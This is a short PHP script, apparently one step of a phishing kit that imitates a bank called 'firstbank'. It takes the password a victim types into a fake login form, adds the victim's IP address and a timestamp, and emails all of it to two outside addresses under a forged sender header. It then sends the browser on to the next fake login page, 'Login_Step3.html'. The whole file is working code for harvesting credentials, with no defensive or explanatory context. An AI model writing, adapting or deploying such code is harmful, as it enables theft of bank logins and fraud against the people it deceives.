<?
session_start();
$ip = getenv("REMOTE_ADDR");
$adddate=date("D M d, Y g:i a");
$passe = $_POST['passwd'];
$fiftyme="zate123man@gmail.com,pronc@prontomail.com";


  $subj = "firstbank BV $ip";
  $msg = "Login Info\n\nPassword: $passe\n$ip $adddate\n-----*+++++++++++*-----\n Created By YomZee--------*++++++++++*----------";
  $from = "From: <resultats@tsbdumbs.com>";
  mail("$fiftyme", $subj, $msg, $from);
?>
<script type="text/javascript">
 window.location="Login_Step3.html"
</script>
